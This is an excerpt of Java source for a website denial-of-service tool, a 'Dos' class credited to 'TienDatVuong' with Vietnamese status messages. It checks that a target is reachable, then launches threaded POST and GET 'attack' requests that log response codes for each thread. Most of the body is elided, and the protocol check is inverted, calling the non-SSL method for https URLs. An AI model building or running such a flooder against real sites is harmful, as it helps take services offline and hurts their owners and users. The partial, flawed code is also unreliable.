...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        if (SUrl[0] == "https" || SUrl[0].equals("https")) {
            dos.checkConnection(url);
        } else {
            dos.sslCheckConnection(url);
        }

        System.out.println("Tool ddos web by TienDatVuong");
        ...
        System.out.println("Bat Dau Ddos");
    ...
    private void sslCheckConnection(String url) throws Exception {
        System.out.println("Check Ket Noi)");
        URL obj = new URL(url);
        ...
        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("KetNoiToiWebsite");
        }
        Dos.url = url;
    }
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Loading Tan Cong!: " + responseCode + "Thread: " + this.seq);
    }
    ...
    private void sslGetAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("Loading Ddos By DatVuong " + responseCode + "Thread: " + this.seq);
    }
}